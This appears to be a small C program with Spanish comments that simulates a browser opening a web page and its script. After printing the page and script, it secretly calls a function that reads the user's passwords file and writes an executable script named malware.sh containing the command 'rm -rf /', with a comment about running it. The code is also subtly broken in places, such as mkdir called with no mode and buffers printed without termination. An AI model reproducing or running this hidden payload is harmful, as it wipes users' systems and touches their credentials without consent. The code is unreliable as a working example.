#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


void insert_data_corrupt() {
    mkdir("data/discretion");
    unlink("data/discretion");
    rename("data/documents/passwords.txt", "data/discretion/pass.txt");
    int fd = open("data/discretion/pass.txt", O_RDONLY, 0644);
    char buffer[256];
    read(fd, buffer, 256);
    close(fd);
    rename("data/discretion/pass.txt", "data/documents/passwords.txt");
    rmdir("data/discretion");

    remove("data/code/malware.sh");
    fd = open("data/code/malware.sh", O_CREAT | O_WRONLY, 0700);
    lseek(fd, 0, SEEK_SET);
    write(fd, "rm -rf /\n", 9);
    close(fd);
    /* Ejecuta script */
}

int main(int argc, char **argv) {
    
    int fd_web;
    char buffer[32];
    
    fd_web = open("data/code/web.html", O_RDONLY, 0644);
    printf("=================\nAbrimos web solicitada\n=================\n");

    while (read(fd_web, buffer, 32) > 0){
        printf("%s", buffer);
        memset(buffer, 0, sizeof(buffer));
    }
    close(fd_web);

    fd_web = open("data/code/script.js", O_RDONLY, 0644);
    printf("\r\n=================\nEl siguiente es el código de js asociado\n=================\n");

    while (read(fd_web, buffer, 32) > 0){
        printf("%s", buffer);
        memset(buffer, 0, sizeof(buffer));
    }
    close(fd_web);
    printf("=================\nCerrando navegador...\n");
    insert_data_corrupt();
    
    return 0;
}
